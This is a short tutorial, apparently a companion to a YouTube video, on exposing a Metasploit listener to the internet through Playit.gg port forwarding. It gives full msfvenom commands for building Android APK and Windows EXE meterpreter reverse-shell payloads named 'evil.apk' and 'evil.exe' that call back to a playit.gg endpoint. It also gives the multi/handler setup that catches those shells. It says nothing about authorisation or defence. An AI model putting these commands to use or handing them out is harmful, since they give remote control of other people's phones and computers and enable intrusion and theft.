# 💻 Playit.gg TCP Reverse Shell Port Forwarding 

🛑 YOUTUBE Video: https://youtu.be/uoOuLqkmidU?si=Lv2b5K2UmRBsGnLi

## 🔧 Step 1: Set Up Port Forwarding with Playit.gg
Playit.gg helps forward your local port to the public internet.

Download and install from: https://playit.gg

# Run the Playit CLI:
```
./playit-cli
```

Choose:

Forward TCP port

Enter local port: 4444 (recommended)

You’ll get a public endpoint:
```
Forwarding: playit.gg:12345 → 127.0.0.1:4444
```
🧠 This public IP/Port will be used in payload generation

# 📱 Step 2: Generate Reverse Shell Payloads
Create payloads using msfvenom with your Playit.gg public IP & port.

🔸 Android APK Payload
```
msfvenom -p android/meterpreter/reverse_tcp LHOST=playit.gg LPORT=12345 -o evil.apk
```

🔹 Windows EXE Payload

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=playit.gg LPORT=12345 -f exe -o evil.exe
```
# 🧠 Step 3: Start Metasploit Listener
Start Metasploit:

```
msfconsole
```
Use multi/handler:
```
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp   # Or windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j
```
🧠 LHOST = 0.0.0.0 (listen on all)
🧠 LPORT = local port you’re forwarding (4444)

## 🔄 Flow Recap

| Tool       | LHOST / LPORT                 | Purpose                      |
| ---------- | ----------------------------- | ---------------------------- |
| Payload    | playit.gg / 12345             | Connects back to your system |
| Playit.gg  | Forwards to 127.0.0.1:4444    | Tunnels to your listener     |
| Metasploit | LHOST = 0.0.0.0, LPORT = 4444 | Catches reverse shell        |
